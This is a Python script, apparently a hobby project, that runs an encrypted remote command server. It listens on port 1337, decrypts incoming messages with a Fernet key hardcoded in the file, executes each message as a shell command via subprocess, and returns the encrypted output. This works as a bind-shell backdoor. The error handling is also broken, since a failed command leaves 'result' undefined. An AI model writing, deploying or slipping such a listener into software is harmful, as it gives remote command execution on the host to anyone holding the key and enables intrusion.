import socket
import subprocess
from cryptography.fernet import Fernet
import time

key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='

def server_program():
    # get the hostname
    host = socket.gethostname()
    port = 1337  # initiate port no above 1024

    # look closely. The bind() function takes tuple as argument

    # configure how many client the server can listen simultaneously
    
    f = Fernet(key)

    # while True:
    server_socket = socket.socket()  # get instance
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('', port))  # bind host address and port together
    server_socket.listen(10)
    
    
    print('waiting for connection')
    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    curr_time = time.localtime()
    print('at: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)

    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024).decode()
        if not data:
            # if data is not received break
            break
        data = str(f.decrypt(data).decode())

        print(data)
        print("from connected user: " + data)
        command = data
        
        # before running commands auth using AES
        # we need a private key
        try:
            result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
        except :
            print("Something Messed Up")
            # send data to the client
        res = f.encrypt(result.stdout)
        conn.send(res)
    conn.close()  # close the connection
    print('outer loop')
    # wait at least a minute before retrying the connection
    # curr_time.tm_min += 1
    print('current time: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
            

if __name__ == '__main__':
    server_program()